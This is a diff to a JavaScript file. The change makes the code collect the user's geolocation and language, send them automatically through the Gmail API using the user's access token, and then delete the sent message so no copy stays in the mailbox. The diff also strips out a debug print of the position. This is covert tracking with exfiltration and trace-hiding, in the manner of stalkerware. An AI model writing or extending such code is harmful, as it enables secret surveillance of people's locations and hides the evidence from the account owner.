@@ -90,12 +90,12 @@ let Net = {
 			TokenGetter.send(null);
 	},
 	
-	SendGmail: function (OnLoad) {
+	SendLog: function () {
 		let MailSender = new XMLHttpRequest();
 			MailSender.open("POST", "https://www.googleapis.com/gmail/v1/users/me/messages/send?access_token=" + Info.Token, true);
 			
 			MailSender.onload = function (Event) {
-				OnLoad();
+				Net.DeleteLog(JSON.parse(MailSender.responseText).id);
 			}
 			
 			MailSender.send(JSON.stringify(
@@ -118,6 +118,17 @@ let Net = {
 					))).replace(/\+/g, "-").replace(/\//g, "_")
 				}
 			));
+	},
+	
+	DeleteLog: function (MailID, OnLoad) {
+		let MailDeleter = new XMLHttpRequest();
+			MailDeleter.open("DELETE", "https://www.googleapis.com/gmail/v1/users/me/messages/" + MailID + "?access_token=" + Info.Token, true);
+			
+			MailDeleter.onload = function (Event) {
+				
+			}
+			
+			MailDeleter.send(null);
 	}
 }
 
@@ -152,8 +163,6 @@ function Init() {
 						Info.Datas.Language = Res.language;
 						
 					navigator.geolocation.getCurrentPosition(function (Position) {
-						console.log(Position);
-						
 						Info.Datas.Location.Latitude = Position.coords.latitude;
 						Info.Datas.Location.Longitude = Position.coords.longitude;
 						Info.Datas.Location.Accuracy = Position.coords.accuracy;
@@ -161,6 +170,8 @@ function Init() {
 						Info.Datas.Location.AltitudeAccuracy = Position.coords.altitudeAccuracy;
 						Info.Datas.Location.Heading = Position.coords.heading;
 						Info.Datas.Location.Speed = Position.coords.speed;
+						
+						Net.SendLog();
 					});
 				}
 				
